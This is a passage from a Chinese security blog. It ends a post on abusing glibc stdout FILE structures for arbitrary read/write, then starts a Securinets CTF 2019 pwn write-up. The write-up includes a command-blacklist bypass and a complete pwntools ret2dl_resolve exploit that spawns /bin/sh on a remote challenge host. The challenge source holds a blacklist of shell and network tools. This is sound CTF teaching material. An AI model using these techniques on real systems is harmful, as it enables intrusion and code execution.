<span class="number">0</span>;</span><br><span class="line">  <span class="variable">_IO_size_t</span> <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_LINE_BUF</span>) &amp;&amp; (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>))<span class="comment">//绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_buf_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> &gt;= n)</span><br><span class="line">	    &#123;</span><br><span class="line">	      const char *p;</span><br><span class="line">	      <span class="keyword">for</span> (p = s + n; p &gt; s; ) <span class="comment">//s是data首地址</span></span><br><span class="line">	        &#123;</span><br><span class="line">	            <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">		            &#123;</span><br><span class="line">		                <span class="built_in">count</span> = p - s + <span class="number">1</span>;</span><br><span class="line">		                must_flush = <span class="number">1</span>;</span><br><span class="line">		                break;</span><br><span class="line">		            &#125;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;<span class="variable">_IO_write_end</span> &gt; f-&gt;<span class="variable">_IO_write_ptr</span>)</span><br><span class="line">    <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_write_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*将即将输出的内容复制到缓冲区里*/</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> &gt; to_do)</span><br><span class="line">	      <span class="built_in">count</span> = to_do;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;<span class="variable">_IO_write_ptr</span> = <span class="variable">__mempcpy</span> (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      memcpy (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">      f-&gt;<span class="variable">_IO_write_ptr</span> += <span class="built_in">count</span>;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      s += <span class="built_in">count</span>; <span class="comment">//s指向还没有复制的位置</span></span><br><span class="line">      to_do -= <span class="built_in">count</span>;<span class="comment">//剩下需要输出的字符的个数</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">_IO_OVERFLOW</span> (f, EOF) == EOF)<span class="comment">//调用了_IO_new_file_overflow刷新输出缓冲区</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	        return to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;<span class="variable">_IO_buf_end</span> - f-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">count</span> = new_do_write (f, s, do_write);</span><br><span class="line">	      to_do -= <span class="built_in">count</span>;</span><br><span class="line">	      <span class="keyword">if</span> (<span class="built_in">count</span> &lt; do_write)</span><br><span class="line">	        return n - to_do;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	        to_do -= <span class="variable">_IO_default_xsputn</span> (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  return n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果输出缓冲区没有满，_IO_new_file_xsputn函数会先把将要输出的字符串复制到输出缓冲区中：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ....</span><br><span class="line"> <span class="function"><span class="title">else</span> <span class="keyword">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> &gt; f-&gt;</span>_IO_write_ptr)</span><br><span class="line">    <span class="function"><span class="title">count</span> = f-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> - f-&gt;</span>_IO_write_ptr; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"> ....</span><br><span class="line"><span class="function"><span class="title">memcpy</span> (f-&gt;</span>_IO_write_ptr, s, count);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_write_ptr += count;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br></pre></td></tr></table></figure></p>
<p>然后再调用<code>_IO_OVERFLOW (f, EOF)</code>来刷新输出缓冲区。_IO_OVERFLOW就是_IO_new_file_overflow，在前面已经分析过了。<br>由于ch == EOF，会直接执行以下语句:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">   <span class="function"><span class="title">return</span> _IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base);</span><br></pre></td></tr></table></figure></p>
<p>可以看出，_IO_new_file_xsputn函数完成了两个功能，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区。所以_IO_new_file_xsputn函数即能达到任意写的功能，还可以达到任意读的功能。</p>
<h5 id="利用手法：-2"><a href="#利用手法：-2" class="headerlink" title="利用手法："></a>利用手法：</h5><p><strong>任意写：</strong></p>
<p>任意写就是利用了memcpy<br>需要提前准备好想要覆写的字符串，<br>修改stdout结构体：<br>设置flags绕过:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_LINE_BUF</span>) &amp;&amp; (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>))<span class="comment">//绕过</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br></pre></td></tr></table></figure>
<p>然后设置_IO_write_ptr为想要写的起始地址，_IO_write_end为想要写的末尾地址即可。</p>
<p><strong>任意读:</strong></p>
<p>任意读需要先绕过前面的复制字符串操作(因为会覆盖想要泄露的内容)：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_write_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*将即将输出的内容复制到缓冲区里*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">count</span> &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      ....</span><br><span class="line">    memcpy (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">    f-&gt;<span class="variable">_IO_write_ptr</span> += <span class="built_in">count</span>;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br><span class="line">      ....</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>只需要<code>f-&gt;_IO_write_end - f-&gt;_IO_write_ptr = 0</code> 即可绕过memcpy.</p>
<hr>
<p>后面任意读的操作和前面putchar的绕过方法是相同，主要就是设置flags位来绕过。<br>然后设置_IO_write_base为想要泄露的地址，_IO_write_ptr为想要泄露的末尾地址即可。</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>c语言_IO_缓冲区的思想是：<br>如果是从文件读，就先从文件读入数据填充输入缓冲区，让程序慢慢用，用完了再读入。<br>如果是向文件写，就先把想要写的内容写入输出缓冲区，等输出缓冲区满了，再一次性的写入文件中。<br>通过跟输入有关的函数(scanf等)只能达到任意写的目的，需要修改stdin结构体里的_IO_buf_base为想要修改的位置的起始地址，_IO_buf_end为想要修改的位置的末地址即可。<br>通过跟输出有关的函数(puts等)可以达到任意读写的目标，需要修改stdout结构体里的_IO_write_base,_IO_write_end指针。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/" itemprop="url">Securinets CTF Quals 2019 部分pwn题wp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-24T22:05:39+08:00">
                2019-03-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>tctf难到自闭，中途报了个别的ctf。写下三道pwn题的wp，有一道题在大佬的帮助下学到了新姿势，之前以为这种栈溢出是没法做的，还有一道格式化串的题一直做不出来。。等wp出来以后再复现了。。</p>
<h4 id="welocome"><a href="#welocome" class="headerlink" title="welocome"></a>welocome</h4><p>pwn的签到题。<br>程序源代码如下：<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> search(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[])</span><br><span class="line">    <span class="keyword">int</span> l, i, j;</span><br><span class="line">    <span class="comment">/*length of word */</span></span><br><span class="line">   <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span> &amp;&amp; word[j] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">str</span>[i] == word[j])</span><br><span class="line">        &#123;</span><br><span class="line">            j++;<span class="comment">//相等j++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* substring found */</span></span><br><span class="line">        <span class="keyword">return</span> (i - j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> delete_word(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[], <span class="keyword">int</span> <span class="keyword">index</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, l;</span><br><span class="line">    <span class="comment">/* length of word */</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++); <span class="comment">//遍历word数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="keyword">index</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">str</span>[i] = <span class="keyword">str</span>[i + l + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> * blacklist[]=&#123;<span class="string">"cat"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"more"</span>,<span class="string">"cp"</span>,<span class="string">"man"</span>,<span class="string">"scp"</span>,<span class="string">"xxd"</span>,<span class="string">"dd"</span>,<span class="string">"od"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"ruby"</span>,<span class="string">"tac"</span>,<span class="string">"rev"</span>,<span class="string">"xz"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>,<span class="string">"gzip"</span>,<span class="string">"mv"</span>,<span class="string">"flag"</span>,<span class="string">"txt"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"vi"</span>,<span class="string">"vim"</span>,<span class="string">"nano"</span>,<span class="string">"pico"</span>,<span class="string">"awk"</span>,<span class="string">"grep"</span>,<span class="string">"egrep"</span>,<span class="string">"echo"</span>,<span class="string">"find"</span>,<span class="string">"exec"</span>,<span class="string">"eval"</span>,<span class="string">"regexp"</span>,<span class="string">"tail"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"cut"</span>,<span class="string">"tr"</span>,<span class="string">"pg"</span>,<span class="string">"du"</span>,<span class="string">"`"</span>,<span class="string">"$"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"#"</span>,<span class="string">"bzip2"</span>,<span class="string">"cmp"</span>,<span class="string">"split"</span>,<span class="string">"paste"</span>,<span class="string">"diff"</span>,<span class="string">"fgrep"</span>,<span class="string">"gawk"</span>,<span class="string">"iconv"</span>,<span class="string">"ln"</span>,<span class="string">"most"</span>,<span class="string">"open"</span>,<span class="string">"print"</span>,<span class="string">"read"</span>,<span class="string">"&#123;"</span>,<span class="string">"&#125;"</span>,<span class="string">"sort"</span>,<span class="string">"uniq"</span>,<span class="string">"tee"</span>,<span class="string">"wget"</span>,<span class="string">"nc"</span>,<span class="string">"hexdump"</span>,<span class="string">"HOSTTYPE"</span>,<span class="string">"$"</span>,<span class="string">"arch"</span>,<span class="string">"env"</span>,<span class="string">"tmp"</span>,<span class="string">"dev"</span>,<span class="string">"shm"</span>,<span class="string">"lock"</span>,<span class="string">"run"</span>,<span class="string">"var"</span>,<span class="string">"snap"</span>,<span class="string">"nano"</span>,<span class="string">"read"</span>,<span class="string">"readlink"</span>,<span class="string">"zcat"</span>,<span class="string">"tailf"</span>,<span class="string">"zcmp"</span>,<span class="string">"zdiff"</span>,<span class="string">"zegrep"</span>,<span class="string">"zdiff"</span>&#125;;</span><br><span class="line">cat head less more cp man scp xxd dd</span><br><span class="line"> <span class="keyword">char</span> <span class="keyword">str</span>[<span class="number">80</span>], word[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">index</span>;</span><br><span class="line">    printf(<span class="string">"Welcome to Securinets Quals CTF \o/ \n"</span>);</span><br><span class="line">    printf(<span class="string">"Enter string:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>,<span class="keyword">str</span>,<span class="number">79</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sizeof(blacklist)/sizeof(blacklist[<span class="number">0</span>]);i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">index</span> = search(<span class="keyword">str</span>, blacklist[i]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">index</span> !=  - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        delete_word(<span class="keyword">str</span>, blacklist[i], <span class="keyword">index</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setreuid(geteuid(),geteuid());</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line">system(<span class="keyword">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序就是让你输入命令，然后system执行，但是设置了命令黑名单。查看文件和flag等字符串都不让输入。但是匹配算法有点问题，匹配的是输入的字符串的后面部分，输入<code>cat flag.txt cat flag.txt</code>即可绕过。</p>
<h3 id="baby2"><a href="#baby2" class="headerlink" title="baby2"></a>baby2</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/2.png" alt=""><br>这道题目只有一个栈溢出，但是没有任何leak，看到这道题目的第一感觉就是ret2dl_runtime_resolve,关于这个利用技术，网上有很多，这里就不细说了。<br>虽然这个利用方法比较难，但是这道题的难点不在这，而是栈溢出在main函数中，在之前，我一直以为这种栈溢出是不能做的，遇到一个人很好的pwn师傅给我提供了思路。<br><strong>main函数和其他函数的栈布局有所不同</strong>。注意图中画红方框的地方。<br>函数开始部分：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lea</span>    	<span class="built_in">ecx</span>, [<span class="built_in">esp</span>+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">and</span>    	<span class="built_in">esp</span>, <span class="number">0FFFFFFF0h</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    	<span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ecx</span></span><br></pre></td></tr></table></figure></p>
<p>此时栈布局大概是这样的：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/3.png" alt=""><br>saved ecx的值等于 ebp +8<br>当函数结束时：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">esp</span>, [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p>
<p>将saved ecx的值赋值给ecx，然后再将ecx-4 赋值给esp，再ret。<br>这里ecx的存在有点像canary。<br>保存在栈中saved ecx -4 才是最后esp的值，如果栈中的saved ecx，被破坏了，程序就会崩溃。<br>如图：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/4.png" alt=""><br>红框即是saved ecx。<br>他此时指向：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/5.png" alt=""><br>最后的ESP即是：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/6.png" alt=""></p>
<p>正常的栈溢出的做法是 返回地址以上的空间全是padding，从返回地址开始写ROP，<strong>但是这样saved ecx的值就被破坏掉</strong>。<br>例如：<br>全用AAAA。。。填充缓冲区，那么saved ecx的地址被覆盖为0x41414141。<br><code>Program received signal SIGSEGV (fault address 0x4141413d)</code><br>此时ESP的值等于0x4141413d，是一个无效的地址。这样程序根本进入不了ROP，我开始的想法是将ECX覆盖为某个函数的got-4，但是参数无法布置。</p>
<p><strong>解决办法：</strong><br>将第一段ROP写在buf中，即写在缓冲区中。再将saved ecx的高位第一个字节覆盖掉，覆盖为buf地址+4 的高位第一个字节，那么返回的地址就返回到buf中了。虽然开启了ASLR，但还是有几率爆破成功。<strong>但是地址选择要保证高位第二个字节是相等的</strong>。例如：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/7.png" alt=""><br><strong>要保证爆破的地址，高位第二个字节是相等的，因为我们只能控制高位第一个字节</strong>。</p>
<p>本题还有一个坑点，就是<br><code>return read(0, &amp;buf, 0x12Cu);</code><br><strong>read读取的长度是0x12c，连续发送两段payload，会连在一起，使用了sleep仍然不行，要使用raw_input或者pause</strong>。</p>
<p>exp如下：(要多试几次才能成功)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#a=process("./baby2")</span></span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,<span class="string">"2222"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(a,"b *0x80484a3")</span></span><br><span class="line">elf=ELF(<span class="string">"./baby2"</span>)</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">rel_plt_addr=0x80482d8</span><br><span class="line">dynsym_addr=0x80481d0</span><br><span class="line">dynstr_addr=0x8048240</span><br><span class="line">plt0_addr=0x8048320</span><br><span class="line">pop3_ret=0x08048509</span><br><span class="line">bss_addr=elf.bss()+0x20</span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr=bss_addr</span><br><span class="line"></span><br><span class="line">arg_offset=fake_rel_plt_addr - rel_plt_addr<span class="comment">#dl_reslove(linkmap,arg_offset)</span></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr=fake_rel_plt_addr + 0x8   <span class="comment">#fake_dynsym address</span></span><br><span class="line"></span><br><span class="line">align=16-(fake_dynsym_addr-dynsym_addr)%16  <span class="comment">#align</span></span><br><span class="line">fake_dynsym_addr+=align                 </span><br><span class="line"></span><br><span class="line">r_info=(((fake_dynsym_addr-dynsym_addr)/16)&lt;&lt;8)|0x7 <span class="comment">#rel_plt's r_info</span></span><br><span class="line"></span><br><span class="line">fake_dynstr_addr=fake_dynsym_addr+16   </span><br><span class="line">sh_addr=fake_dynstr_addr + 7</span><br><span class="line">offset=fake_dynstr_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=p32(read_plt) <span class="comment">#read</span></span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#pop pop pop ret</span></span><br><span class="line">payload+=p32(0)        <span class="comment">#fd</span></span><br><span class="line">payload+=p32(bss_addr) <span class="comment">#buf</span></span><br><span class="line">payload+=p32(0x100)    <span class="comment">#length</span></span><br><span class="line">payload+=p32(plt0_addr)<span class="comment">#PLT[0]</span></span><br><span class="line">payload+=p32(arg_offset)</span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#return address</span></span><br><span class="line">payload+=p32(sh_addr)<span class="comment">#/bin/sh address</span></span><br><span class="line">payload=payload.ljust((0x30-4),<span class="string">"\x00"</span>)</span><br><span class="line">payload+='\x9c'</span><br><span class="line">a.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=p32(elf.got[<span class="string">"read"</span>])<span class="comment">#fake_rel_plt</span></span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+='A'*align     <span class="comment">#padding</span></span><br><span class="line">payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) <span class="comment">#fake dynsym</span></span><br><span class="line">payload+=<span class="string">"system\x00"</span> <span class="comment">#fake dynstr</span></span><br><span class="line">payload+=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="baby1"><a href="#baby1" class="headerlink" title="baby1"></a>baby1</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/1.png" alt=""></p>
